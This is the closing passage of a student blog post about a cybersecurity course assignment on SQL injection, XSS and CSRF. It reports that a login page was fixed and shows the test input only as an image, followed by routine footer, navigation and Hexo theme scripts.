<p>Now, I have fixed it, and the login page is protected well. If you enter the following statement in Username and click “Login”, the page will show “Password incorrect”.</p>
<p><img src="10.png"></p>
<p>I had a lot of fun in this assignment. Thank you so much!</p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/SQLi/" rel="tag"># SQLi</a>
              <a href="/tags/XSS/" rel="tag"># XSS</a>
              <a href="/tags/CSRF/" rel="tag"># CSRF</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2021/01/20/Master%20of%20Cybersecurity/FIT5003/FIT5003%20Assignment%201/" rel="prev" title="FIT5003 Assignment 1 - BOF, FSV, and Android & Java Security">
                  <i class="fa fa-chevron-left"></i> FIT5003 Assignment 1 - BOF, FSV, and Android & Java Security
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2021/01/25/Master%20of%20Cybersecurity/FIT5003/FIT5003%20SQLi/" rel="next" title="FIT5003 SQL Injection">
                  FIT5003 SQL Injection <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>







<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      const commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>
</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Daisy</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
  </div>

    </div>
  </footer>

  
  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/@next-theme/pjax@0.4.0/pjax.min.js"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script>
var pjax = new Pjax({
  selectors: [
    'head title',
    '.page-configurations',
    '.main-inner',
    '.post-toc-wrap',
    '.languages',
    '.pjax'
  ],
  analytics: false,
  cacheBust: false,
  scrollRestoration: false,
  scrollTo: !CONFIG.bookmark.enable
});

document.addEventListener('pjax:success', () => {
  pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
  NexT.boot.refresh();
  // Define Motion Sequence & Bootstrap Motion.
  if (CONFIG.motion.enable) {
    NexT.motion.integrator
      .init()
      .add(NexT.motion.middleWares.subMenu)
      .add(NexT.motion.middleWares.postList)
      .bootstrap();
  }
  const hasTOC = document.querySelector('.post-toc');
  document.querySelector('.sidebar-inner').classList.toggle('sidebar-nav-active', hasTOC);
  document.querySelector(hasTOC ? '.sidebar-nav-toc' : '.sidebar-nav-overview').click();
  NexT.utils.updateSidebarPosition();
});
</script>


  







  




    <div class="pjax">


    </div>
</body>
</html>
